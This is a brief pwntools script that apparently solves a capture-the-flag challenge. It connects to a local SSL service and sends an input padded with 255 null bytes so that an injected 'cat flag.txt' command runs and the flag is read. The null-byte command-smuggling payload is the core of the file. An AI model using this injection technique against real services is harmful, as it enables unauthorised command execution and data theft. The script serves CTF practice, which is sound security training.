from pwn import *

# conn = process("service")
conn = remote("127.0.0.1", 50000, ssl=True)

conn.sendline(b"ls")
conn.sendline(b"." + b"\x00" * 255 + b"cat flag.txt")

print(conn.recvall().decode().split("\n")[2])
